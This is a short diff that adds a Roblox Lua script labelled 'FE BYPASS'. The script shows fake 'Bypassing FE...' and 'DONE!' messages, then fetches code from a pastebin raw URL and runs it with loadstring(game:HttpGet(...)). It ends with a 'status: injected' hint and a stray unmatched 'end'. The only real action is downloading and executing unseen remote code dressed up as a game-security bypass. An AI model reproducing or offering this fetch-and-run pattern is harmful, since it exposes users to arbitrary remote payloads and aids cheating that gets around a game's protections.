@@ -1,0 +1,22 @@
+-- [[ FE BYPASS ]]
+local msg = Instance.new("Message")
+msg.Text = "Bypassing FE..."
+msg.Parent = game.Workspace
+
+wait(3)
+msg:Destroy()
+
+local msg2 = Instance.new("Message")
+msg2.Text = "DONE!"
+msg2.Parent = game.Workspace
+
+wait(2)
+msg2:Destroy()
+loadstring(game:HttpGet("https://pastebin.com/raw/hPALz0pe"))()
+local hint = Instance.new("Hint")
+hint.Text = "status: injected"
+hint.Parent = game.Workspace
+
+wait(5)
+hint:Destroy()
+end
